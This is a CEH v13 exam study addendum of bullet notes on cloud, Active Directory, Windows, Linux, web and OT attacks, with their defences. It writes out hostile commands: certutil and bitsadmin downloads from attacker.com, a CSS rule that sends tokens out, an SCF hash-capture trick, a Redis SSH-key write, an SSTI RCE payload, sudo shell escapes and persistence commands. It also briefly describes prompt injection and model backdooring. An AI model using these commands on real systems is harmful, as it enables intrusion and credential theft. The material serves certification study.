# CEH v13 Emerging Concepts & Master Exam Addendum (Complete Exhaustive Version)

> **Status:** 🎯 Master Consolidated Addendum (All Practice Tests 1–4 Integrated)  
> **Coverage:** Cloud & Containers, AI/LLM Security, Active Directory & Hybrid Identity, Modern Web/API Vulnerabilities, Digital Forensics & IR, Advanced Malware Evasion, Cryptography, and Network Exploitation  

---

# 1. Cloud, Container & Serverless Infrastructure

### Cloud Attack Surface & Posture Management
* **Shadow IT:** Technology, personal cloud storage (Dropbox, unauthorized SaaS, developer accounts) deployed by business units without IT/security approval. Detected using **CASB** (Cloud Access Security Brokers), DNS log analytics, and **EASM**.
* **EASM (External Attack Surface Management):** Continuous discovery, inventorying, and risk assessment of all internet-facing assets (forgotten subdomains, unlinked APIs, misconfigured S3 buckets, exposed dev environments) from an outside-in attacker perspective (tools: CyCognito, Censys ASM).
* **CTEM (Continuous Threat Exposure Management):** Gartner's 5-stage continuous security cycle designed to replace point-in-time penetration testing:
  $$\mathbf{Scope} \longrightarrow \mathbf{Discover} \longrightarrow \mathbf{Prioritize} \longrightarrow \mathbf{Validate} \longrightarrow \mathbf{Mobilize}$$
* **Attack Path Management (APM):** Graph-based risk modeling that visualizes exploit chains connecting multi-step low/medium vulnerabilities across network boundaries to critical crown jewels (Domain Controllers, production databases).
* **CNAPP (Cloud-Native Application Protection Platform):** Integrated cloud defense suite combining:
  * **CSPM (Cloud Security Posture Management):** Detects misconfigurations, compliance violations, and public storage buckets.
  * **CWPP (Cloud Workload Protection Platform):** Runtime threat detection, container/VM vulnerability scanning, and process drift defense.
  * **CIEM (Cloud Infrastructure Entitlement Management):** Audits and eliminates excessive IAM permissions and unused privileges.

### AWS Exploitation & Architecture Attacks
* **AWS Instance Metadata Service (IMDS SSRF):**
  * Target Link-Local Endpoint: `http://169.254.169.254/latest/meta-data/iam/security-credentials/[role-name]`
  * Returns: Temporary IAM access keys (`AccessKeyId`, `SecretAccessKey`, `Token`).
  * **IMDSv2 Defense:** Requires a session token via `PUT` request with the header `X-aws-ec2-metadata-token: [token]` and disables simple `GET` SSRF exploitation.
* **AWS Security Token Service (STS) & IAM Privilege Escalation:**
  * Attackers with limited access abuse `sts:AssumeRole` via `aws sts assume-role --role-arn <ARN> --role-session-name <name>` to elevate permissions across accounts.
  * Common IAM escalation permissions: `iam:CreatePolicyVersion`, `iam:SetDefaultPolicyVersion`, `iam:PassRole` (passing admin roles to EC2/Lambda), `iam:AttachUserPolicy` (`AdministratorAccess`).
* **Confused Deputy Problem:** Occurs when a privileged service (deputy) in Account A is tricked by an unprivileged attacker in Account B into accessing resources on the attacker's behalf. Mitigated in AWS by enforcing the `sts:ExternalId` condition key and restricting `Principal` account IDs in trust policies.
* **AWS GuardDuty:** Continuous threat detection engine that ingests **CloudTrail logs**, **VPC Flow Logs**, and **DNS query logs**; uses machine learning to alert on cryptomining, EC2 communicating with known C2 IPs, unauthorized API calls from Tor, and data exfiltration.
* **AWS S3 Bucket ACL & Policy Misconfigurations:**
  * `Principal: *` + `Action: s3:GetObject`: Unauthenticated public read exposure.
  * `Action: s3:PutObject` for any principal: Unauthenticated upload enabling malware hosting on trusted corporate domains, defacement, or poisoning software build dependencies.
  * **Listable vs. Readable:** `s3:ListBucket` exposes object names/inventory (business logic disclosure); `s3:GetObject` permits downloading raw file contents.
* **Secrets Sprawl:** Uncontrolled dispersal of hardcoded API keys, JWT secrets, database connection strings, and SSH keys in Git histories (`.git`), Dockerfile layers, environment variables, and CI/CD pipeline logs. Detected with `TruffleHog`, `Gitleaks`, and `Semgrep`.
* **Serverless Security (AWS Lambda / Azure Functions):** Unique attack vectors include overprivileged execution IAM roles, secrets exposed in plaintext environment variables, event payload injection (parsing unvalidated SQS/SNS/S3 event data), and cold-start state persistence.
* **Event-Driven Architecture Message Injection:** Attacking asynchronous message brokers (Apache Kafka, RabbitMQ, AWS SQS/SNS). If consumers parse message bodies without sanitization, injecting malicious payloads into the queue triggers remote code execution (RCE) across backend microservices.

### Container & Network Virtualization Security
* **Kubernetes RBAC Misconfigurations:** Overly permissive `ClusterRoleBindings` (such as binding `cluster-admin` or wildcard `*` verbs to the default service account) enable cluster takeover.
* **Container Escape Vectors:**
  * Mounting `/var/run/docker.sock` inside a container allows the container to spawn a sibling container that mounts the host root filesystem (`/`).
  * Running with `--privileged` flag or `CAP_SYS_ADMIN` capabilities enabled.
  * Kernel vulnerabilities such as runc container breakout (**CVE-2019-5736**).
* **5G Network Slicing:** Creates isolated virtual networks (eMBB for broadband, URLLC for low-latency IoT, mMTC for massive machine communications) on shared 5G physical infrastructure. Weak slice isolation creates cross-tenant data leakage risks.
* **Cloud-Native Ransomware:** Targets cloud management infrastructure—deleting S3 versioning, disabling Azure Recovery Services Vaults, and deleting EBS snapshots before encrypting production data to ensure victims cannot restore from backups.

---

# 2. AI, Machine Learning & Modern Social Engineering

### Adversarial Machine Learning
* **Evasion Attacks (Adversarial Perturbations):** Introducing subtle, imperceptible mathematical noise to inputs (images, PE binary byte sequences) to cause ML-based classifiers and Next-Gen Antivirus (NGAV) to misclassify malicious files as benign.
* **Data Poisoning Attacks:** Injecting malicious samples or biased labels into training datasets during model development to create backdoors or degrade accuracy.
* **Supply Chain Poisoning of Model Weights:** Uploading backdoored, fine-tuned model weights to public hubs (e.g., Hugging Face) containing hidden triggers that cause downstream applications to execute unauthorized actions or bypass safety filters.
* **Model Inversion Attacks:** Repeatedly querying an ML model's inference API and analyzing output confidence scores to mathematically reconstruct sensitive training data (e.g., proprietary datasets, facial images, private medical records).
* **Model Extraction / Stealing:** Systematically querying a black-box ML model API to replicate its internal weights and train a clone model without authorization.

### LLM Security & Generative AI Threats
* **Direct Prompt Injection:** User-supplied prompts crafted to override the system instructions and force the LLM to ignore safety guardrails (jailbreaks).
* **Indirect Prompt Injection:** Adversarial instructions hidden in external data sources (emails, scraped websites, PDFs) processed by an LLM agent that trick the agent into executing unauthorized tasks (e.g., exfiltrating user inbox data).
* **AI Hallucination in Security:** LLMs generating plausible-sounding but completely fabricated CVE numbers, incorrect shell remediation scripts, or broken YARA rules.
* **AI-Augmented Spear Phishing:** Using LLMs trained on scraped victim OSINT (LinkedIn, social media) to generate grammatically perfect, highly tailored spear phishing campaigns at mass scale.

### Advanced Social Engineering & Physical Attacks
* **ClickFix Social Engineering:** A technique that presents victims with a fake browser CAPTCHA or error dialog instructing them to press `Win + R`, paste an obfuscated PowerShell snippet into the Windows Run box, and hit Enter—executing fileless malware via trusted system utilities.
* **OAuth Consent Phishing (Illicit Consent Grants):** Tricking users into granting extensive permissions (e.g., `Mail.ReadWrite`, `Files.ReadWrite.All`) to a malicious third-party OAuth app. Bypasses MFA and password requirements by providing persistent API tokens to the attacker.
* **MFA Fatigue (Push Bombing / MFA Harassment):** Flooding a user's mobile device with repetitive push-notification MFA requests (often late at night) until they approve the prompt out of annoyance or error (mitigated by **FIDO2 hardware keys** or **Number Matching**).
* **Deepfakes & Synthetic Audio/Video:** AI-generated executive voice or video used in Business Email Compromise (BEC) and vishing to instruct employees to execute fraudulent wire transfers.
* **Evil Maid Attack:** An attacker obtaining physical access to an unattended device (e.g., laptop left in a hotel room) to boot from a malicious USB, solder hardware implants, or overwrite the bootloader/firmware with a bootkit (mitigated by **TPM with PIN**, Secure Boot, and tamper-evident seals).

---

# 3. Active Directory, Hybrid Identity & Windows Exploitation

### Windows Persistence Techniques
* **The 4 Primary Windows Persistence Vectors:**
  1. **Registry Run Keys:** `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` and `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
  2. **Scheduled Tasks:** `schtasks /create /sc onstart /tn "MalwareTask" /tr "C:\malware.exe" /ru "SYSTEM"`
  3. **Malicious Windows Services:** `sc create MalwareSvc binpath= "C:\malware.exe" start= auto`
  4. **DLL Search Order Hijacking / DLL Sideloading:** Placing a malicious DLL in an application directory ahead of system paths so a trusted executable loads the malicious library upon execution.

### Active Directory Attack Matrix
* **Golden Ticket:** Forged Kerberos Ticket Granting Ticket (TGT) created using the compromised **`krbtgt` NTLM hash**; grants unrestricted domain persistence for up to 10 years. (Remediation: Reset the `krbtgt` account password **twice** to invalidate current and prior generation tickets).
* **Silver Ticket:** Forged Kerberos Service Ticket (TGS) created using the specific **service account's NTLM hash**; targets a single service directly without communicating with or alerting the Domain Controller.
* **Kerberoasting:** Requesting TGS tickets for accounts with Service Principal Names (SPNs) from the KDC, extracting the RC4/AES encrypted ticket blob, and cracking the plaintext service password offline using `hashcat -m 13100`.
* **AS-REP Roasting:** Targeting user accounts configured with `Do not require Kerberos preauthentication` (`DONT_REQUIRE_PREAUTH`). The attacker requests authentication without supplying a timestamp, capturing the AS-REP response encrypted with the user's NTLM hash for offline cracking (`hashcat -m 18200`).
* **Kerberos Pre-Authentication Brute-Forcing (`kerbrute`):** Sends AS-REQ requests directly to the KDC; generates **Windows Event ID 4771** (Kerberos Pre-Auth Failed) rather than standard **Event ID 4625** (NTLM logon failure), helping evade NTLM-focused monitoring.
* **Skeleton Key (`Mimikatz misc::skeleton`):** Injects an in-memory patch into `lsass.exe` on a Domain Controller so all domain accounts accept a master password (e.g., `mimikatz`) while legitimate user passwords continue to work. Does not survive reboots.
* **DCSync (`Mimikatz lsadump::dcsync`):** Simulates a Domain Controller using the Directory Replication Service (DRS) protocol (`MS-DRSR`) to pull NTLM hashes (including `krbtgt`) directly from active DCs. Requires replication privileges (`DS-Replication-Get-Changes-All`).
* **AD CS ESC1 (Active Directory Certificate Services):** Exploits certificate templates that have `ENROLLEE_SUPPLIES_SUBJECT` enabled and Client Authentication EKU configured, allowing any authenticated domain user to request a valid Kerberos certificate on behalf of any Domain Admin.
* **Resource-Based Constrained Delegation (RBCD):** An attacker with write access (`GenericWrite`) over a target computer object populates its `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute with an attacker-controlled machine account to forge service tickets via S4U extensions.
* **Kerberos Constrained Delegation with Protocol Transition (S4U2Self + S4U2Proxy):**
  * `S4U2Self`: Allows a service to request a Kerberos service ticket to itself on behalf of any arbitrary domain user.
  * `S4U2Proxy`: Uses that ticket to request another ticket to a secondary backend service as the impersonated user.
* **Unconstrained Delegation Abuse:** When enabled on a server, full copies of connecting users' TGTs are cached in memory (`lsass.exe`). Coercing a Domain Controller to authenticate to this server (via **PrinterBug / SpoolSample** `MS-RPRN`) allows extracting the DC's TGT from memory.
* **Pass-the-Ticket (PtT):** Stealing Kerberos tickets (`.kirbi` or `.ccache`) from memory using `Mimikatz kerberos::ptt` or `Rubeus ptt` and reusing them without needing password hashes.
* **Pass-the-Hash (PtH):** Authenticating using captured NTLM hashes across SMB/RPC without cracking them (mitigated by disabling NTLM, SMB signing, and Credential Guard).

### Hybrid Identity & Azure AD (Entra ID)
* **Azure AD Pass-the-PRT:** Stealing the **Primary Refresh Token (PRT)** from an Azure AD-joined device using `Mimikatz sekurlsa::cloudap` or `ROADtoken` to achieve SSO across cloud services without credentials or MFA.
* **Pass-the-Certificate:** Stealing PKCS#12 device certificates (`.pfx`) from Azure AD-enrolled endpoints to authenticate to cloud services and request access tokens.
* **SCF / URL File NTLM Capture:** Dropping `.scf` or `.url` files containing `[Shell] IconFile=\\attacker-ip\share\test.ico` into network file shares. When users browse the folder in Windows Explorer, the OS auto-fetches the icon, transmitting the user's Net-NTLMv2 hash to Responder.
* **NTLM Downgrade Attacks:** Blocking Kerberos KDC traffic or returning `KDC_ERR_PREAUTH_FAILED` to force Windows clients to fall back to NTLM authentication, enabling credential sniffing and relay.

### Windows Post-Exploitation & Evasion Mechanics
* **PrintNightmare (CVE-2021-1675 / CVE-2021-34527):** Remote Code Execution and Local Privilege Escalation flaw in the Windows Print Spooler service allowing unauthenticated RCE as `SYSTEM` via `RpcAddPrinterDriverEx`.
* **MS17-010 (EternalBlue):** Critical SMBv1 buffer overflow exploited by WannaCry and NotPetya. Scanned with `nmap -p 445 --script smb-vuln-ms17-010`.
* **Mimikatz WDigest Plaintext Harvesting:** `sekurlsa::wdigest` extracts plaintext passwords from `lsass.exe` on Windows XP–8.1 or on modern Windows if the registry key `UseLogonCredential=1` is enabled.
* **Windows Credential Guard:** Uses Virtualization-Based Security (VBS) to isolate credential secrets inside the isolated `LSAIso` process, preventing Mimikatz from reading LSASS memory.
* **Living off the Land (LOLBAS):** Using legitimate signed binaries to perform malicious actions:
  * `certutil -urlcache -split -f http://attacker.com/file.exe file.exe`
  * `bitsadmin /transfer job http://attacker.com/file.exe C:\file.exe`
* **AMSI Bypass (Antimalware Scan Interface):** Memory-patching `AmsiScanBuffer` in `amsi.dll` to return `AMSI_RESULT_CLEAN` (0), allowing malicious PowerShell scripts to execute undetected in memory.
* **Process Doppelgänging vs. Process Hollowing:**
  * *Process Hollowing:* Unmaps legitimate code from a suspended process and replaces it with malicious code (detectable via memory vs. disk discrepancies).
  * *Process Doppelgänging:* Uses Windows NTFS Transactions (`TxF`) to write malicious code to a file transaction, create a process from it, and roll back the transaction—leaving a clean file image on disk.
* **Direct Syscalls (SysWhispers / HellsGate):** Calling system calls directly by index to bypass userland API hooks installed by EDR products in `ntdll.dll`.
* **Unquoted Service Paths:** Windows service binaries configured without quotes (e.g., `C:\Program Files\Sub Dir\app.exe`) allow privilege escalation if an attacker places a malicious executable named `C:\Program.exe` or `C:\Program Files\Sub.exe`.
* **Token Impersonation:** Abusing `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` (via tools like JuicyPotato, PrintSpoofer) to impersonate `NT AUTHORITY\SYSTEM`.

---

# 4. Linux & Operational Technology (OT/ICS) Exploitation

### Linux Exploitation & Kernel CVEs
* **Linux Kernel Privilege Escalation Vulnerabilities:**
  * **Dirty COW (CVE-2016-5195):** Race condition in the copy-on-write (COW) memory subsystem allowing unprivileged users to overwrite read-only files.
  * **Dirty Pipe (CVE-2022-0847):** Flaw in the Linux kernel pipe buffer mechanism allowing unprivileged users to overwrite arbitrary data in read-only files (e.g., `/etc/passwd`).
  * **PwnKit (CVE-2021-4034):** Memory corruption vulnerability in Polkit's `pkexec` utility present across major Linux distributions.
  * **RegreSSHion (CVE-2024-6387):** Signal handler race condition in OpenSSH server (`sshd`) on glibc-based Linux systems allowing unauthenticated remote code execution as `root`.
* **Sudo Privilege Escalation (GTFOBins):**
  * `sudo vim -c ':!/bin/bash'`
  * `sudo find / -exec /bin/sh \;`
  * `sudo less /etc/profile` $\rightarrow$ type `!/bin/sh`
  * `sudo python3 -c 'import os; os.system("/bin/bash")'`
* **TOCTOU (Time-of-Check to Time-of-Use):** A race condition where a program checks resource status (e.g., file permissions) and uses the resource later, allowing an attacker to swap the resource (e.g., via a symlink to `/etc/shadow`) in the time gap between check and execution.

### Industrial Control Systems & Mobile Telecom
* **Stuxnet Lessons:** Demonstrated that air-gapped industrial infrastructure can be breached via physical removable media (USB) and that targeted cyber weapons can cause physical damage to PLCs (Siemens S7).
* **High-Yield Industrial & Network Ports:**
  * **Port 502 (Modbus TCP):** Field bus protocol lacking native encryption/authentication; allows arbitrary read/write register access.
  * **Port 4444:** Default listener port for Metasploit Meterpreter reverse TCP payloads.
  * **Port 5985 / 5986 (WinRM):** Windows Remote Management HTTP (5985 - unencrypted NTLM) and HTTPS (5986).
  * **Port 6379 (Redis Unauthenticated RCE):** Open Redis allows arbitrary file write:
    ```bash
    redis-cli -h <target>
    CONFIG SET dir /root/.ssh/
    CONFIG SET dbfilename authorized_keys
    SET payload "\n\nssh-rsa AAAAB3Nza... attacker@kali\n\n"
    SAVE
    ```
* **SS7 (Signaling System No. 7) Vulnerabilities:** Core telecommunications protocol lacking built-in authentication; allows attackers with SS7 access to intercept voice calls, read SMS messages (bypassing SMS 2FA), and track mobile device location globally.
* **IMSI Catchers (Stingrays):** Rogue cellular base stations broadcasting high transmit power to force mobile devices to downgrade connections, harvesting IMSI identifiers and intercepting cellular traffic.
* **Android ADB Vulnerabilities:** Leaving Android Debug Bridge enabled over USB or network (port 5555) allows full unauthenticated device control (`adb shell`, `adb pull /data/data/`).
* **Stagefright (CVE-2015-1538):** Remote code execution vulnerability in Android's `libstagefright` media library triggered automatically upon receiving a malformed MMS message without user interaction.
* **Smart Contract Reentrancy Vulnerability:** A flaw in blockchain contracts where an external contract recursively calls back into the withdrawal function before the balance state is updated, draining funds (e.g., The DAO Hack).

---

# 5. Web Application, API & Reconnaissance Traps

### Advanced Web Application Attacks
* **XML Billion Laughs Attack (XML Entity Bomb):** An XML DoS attack where nested entity definitions expand exponentially in memory (`&lol9;` expands to $10^9$ strings), exhausting server RAM.
* **Server-Side Template Injection (SSTI):** User input evaluated as template expressions in server-side engines (Jinja2, Twig, FreeMarker):
  * Detection payload: `{{7*7}}` $\rightarrow$ returns `49`.
  * Jinja2 RCE payload: `{{ ''.__class__.__mro__[1].__subclasses__()[279]('id',shell=True,stdout=-1).communicate() }}`
* **Prototype Pollution (Client & Server-Side):** Modifying `Object.prototype` (via `__proto__` or `constructor.prototype`) in JavaScript/Node.js. Can lead to authentication bypasses, DOM XSS, or RCE when child process functions inherit polluted properties.
* **DOM Clobbering:** Injecting HTML markup with `id` or `name` attributes (e.g., `<a id="config" href="...">`) to overwrite global JavaScript variables used by client scripts.
* **CSS Injection:** Using CSS attribute selectors (`input[value^='a'] { background: url('https://attacker.com/a'); }`) to exfiltrate anti-CSRF tokens character-by-character without executing JavaScript.
* **DOM-Based XSS:** Occurs entirely in the browser when client-side JavaScript takes data from an untrusted source (`location.search`, `location.hash`, `document.referrer`) and passes it into a dangerous execution sink (`eval()`, `innerHTML`, `document.write()`).
* **HTTP Parameter Pollution (HPP):** Supplying duplicate query parameters (`?id=1&id=2`) to exploit discrepancies in parsing logic between front-end WAFs and backend applications.
* **HTTP Request Smuggling:** Exploits discrepancies in how reverse proxies and back-end web servers process `Content-Length` (CL) and `Transfer-Encoding: chunked` (TE) boundaries (CL.TE, TE.CL, TE.TE), desynchronizing the HTTP request queue.
* **HTTP/2 Rapid Reset (CVE-2023-44487):** Abusing HTTP/2 stream multiplexing by sending streams and immediately cancelling them with `RST_STREAM` frames, exhausting server resources and generating record-breaking DDoS volumes.
* **HTTP Host Header Injection:** Manipulating the `Host:` header to trigger password reset poisoning (reset link sent with attacker's domain), web cache poisoning, or routing bypass.
* **Cross-Site WebSocket Hijacking (CSWSH):** Exploiting WebSockets' lack of Same-Origin Policy enforcement to establish unauthorized, authenticated WebSocket connections from malicious third-party origins.
* **Cross-Origin Resource Policy (CORP):** Header (`Cross-Origin-Resource-Policy: same-origin`) that restricts which origins can load a resource, mitigating Spectre-based side-channel leaks.
* **Mass Assignment:** Web APIs automatically binding unvalidated client JSON parameters directly to backend database models (e.g., submitting `{"admin": true}` to elevate user privileges).
* **Spring Boot Actuator Exposure:** Unauthenticated access to `/actuator/env` reveals environment variables and plaintext API keys; `/actuator/heapdump` leaks raw JVM memory dumps.
* **SAML XML Signature Wrapping (XSW):** Manipulating SAML assertions so that the identity provider validates the signed portion while the service provider processes the modified attacker identity payload.
* **SSRF Scheme Abuse:** Using non-HTTP schemes in SSRF payloads (`file:///etc/passwd`, `gopher://127.0.0.1:6379/...`, `dict://`) to read local files or interact with internal TCP services.
* **Subdomain Takeover:** Dangling DNS `CNAME` records pointing to deleted third-party cloud services (GitHub Pages, AWS S3, Heroku) that attackers can re-register.
* **Soft 404 Handling:** When a server returns `HTTP 200 OK` for nonexistent pages:
  * In **Gobuster**, use the `--wildcard` flag.
  * In **FFUF**, use the response size filter (`-fs <size>`) or word count filter (`-fw <count>`).
* **Clickjacking Defense:** Modern standard: CSP `frame-ancestors 'none'` or `frame-ancestors 'self'` (replaces legacy `X-Frame-Options: DENY`).
* **Security Headers Reference:**
  * `X-Content-Type-Options: nosniff`: Prevents MIME-type sniffing.
  * `Strict-Transport-Security` (HSTS): Enforces HTTPS connections.
  * suppression of `X-Powered-By` and `Server:` headers: Mitigates banner grabbing and version disclosure.

### Reconnaissance & OSINT Tools
* **Recon-ng:** Modular, workspace-driven OSINT framework modeled after Metasploit.
* **WhatWeb:** Web application and CMS technology fingerprinting scanner.
* **Maltego:** Visual link-analysis graph tool mapping relationships between domains, IP addresses, email addresses, and individuals.
* **FOCA:** Extracts hidden metadata from publicly accessible documents (PDF, DOCX, XLSX) to reveal internal usernames, operating systems, and file paths.
* **Certificate Transparency (CT) Logs:** Querying public append-only certificate logs (`crt.sh`) to discover unlinked subdomains and staging infrastructure.
* **Passive DNS:** Databases (SecurityTrails, Farsight DNSDB) tracking historical domain-to-IP mappings to identify attacker C2 infrastructure changes over time.
* **DNSSEC Records:**
  * **NSEC:** Validates non-existence of DNS records but allows attackers to map the entire zone (**Zone Walking**).
  * **NSEC3:** Mitigates zone walking by returning cryptographic hashes of non-existent record names.
* **BGP Hijacking:** Illegitimately announcing IP address prefixes via BGP to reroute internet traffic through an attacker-controlled Autonomous System (AS). Mitigated by **RPKI** (Resource Public Key Infrastructure).

---

# 6. Digital Forensics, Cryptography & Compliance Standards

### Digital Forensics & Incident Response (DFIR)
* **Order of Volatility (RFC 3227):**
  $$\mathbf{CPU\ Registers\ \&\ Cache} \longrightarrow \mathbf{RAM\ (Memory)} \longrightarrow \mathbf{Network\ State} \longrightarrow \mathbf{Running\ Processes} \longrightarrow \mathbf{Disk} \longrightarrow \mathbf{Backups}$$
* **Memory Forensics (Volatility Framework):** Used to analyze volatile RAM dumps (`.raw`, `.dmp`, `.vmem`):
  * `pslist` / `pstree`: Enumerate running processes.
  * `netscan`: List established network connections and sockets.
  * `malfind`: Identify injected code and unmapped memory sections.
  * `mimikatz`: Extract in-memory plaintext credentials and tickets.
* **PowerShell Forensic Artifacts:**
  * **Script Block Logging:** Windows Event ID **4104** (captures executed and deobfuscated code).
  * **Module Logging:** Windows Event ID **4103**.
  * **Command History File:** `%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`.
* **High-Yield Windows Security Event IDs:**
  * `4624`: Successful Logon
  * `4625`: Failed Logon
  * `4720`: User Account Created
  * `4728` / `4732`: Member Added to Privileged Group
  * `4768`: Kerberos TGT Requested (AS-REQ)
  * `4769`: Kerberos Service Ticket Requested (TGS-REQ / Kerberoasting indicator)
  * `4771`: Kerberos Pre-Authentication Failed (Kerbrute indicator)
  * `4776`: NTLM Credential Validation
  * `4662`: Operation Performed on Object (DCSync indicator)
  * `1102`: Security Audit Log Cleared
* **Chain of Custody:** Comprehensive forensic documentation recording the identification, collection, custody, transfer, and analysis of digital evidence, backed by initial and final cryptographic hashes (MD5/SHA-256).
* **YARA Rules:** A pattern-matching language used by incident responders and reverse engineers to identify malware families in files and memory based on string, hexadecimal, and regular expression conditions.
* **User and Entity Behavior Analytics (UEBA):** Analytics using ML to baseline normal entity behavior and flag anomalies like impossible travel, unusual bulk downloads, or off-hours lateral movement.

### Cryptography Principles & Padding Attacks
* **Cryptographic Strength Equivalence (NIST):**
  $$\text{128-bit Symmetric (AES)} \approx \text{3072-bit Asymmetric (RSA/DH)} \approx \text{256-bit Elliptic Curve (ECC)}$$
* **Padding Oracle Attacks:** Exploits PKCS#7 CBC-mode decryption padding error differences to decrypt ciphertexts byte-by-byte (e.g., POODLE). Mitigated by using authenticated encryption (**AES-GCM**, **ChaCha20-Poly1305**).
* **Diffie-Hellman & Logjam:** Weak DH parameters ($<2048$-bit) allow precomputing discrete logarithms to break TLS sessions. Modern TLS enforces ephemeral ECDHE.
* **HMAC (Hash-based Message Authentication Code):** Uses a shared secret key combined with a hash function to provide **integrity and authenticity** (unlike a plain hash, which provides integrity only).
* **Password Storage Standard:** Never encrypt passwords. Always use **memory-hard adaptive hashing** (Argon2id, bcrypt, scrypt) with unique per-user salts.
* **Key Escrow:** A system where cryptographic decryption keys are held by a trusted third party (or government entity); creates a single high-value point of failure.

### Testing Frameworks & Compliance Standards
* **NIST SP 800-115:** Technical Guide to Information Security Testing and Assessment (the authoritative US government penetration testing standard covering planning, discovery, attack, and reporting).
* **MITRE D3FEND:** A defensive knowledge graph mapping countermeasures directly to offensive techniques in the MITRE ATT&CK framework.
* **ISO/IEC 27001:** International standard establishing requirements for an Information Security Management System (ISMS) using the Plan-Do-Check-Act (PDCA) model.
* **PCI DSS v4.0:** Standard for securing cardholder data; mandates quarterly ASV external vulnerability scans and annual penetration tests.
* **Responsible / Coordinated Vulnerability Disclosure:** Security researchers notifying the affected vendor privately and allowing reasonable time (e.g., 90 days) to patch before public release.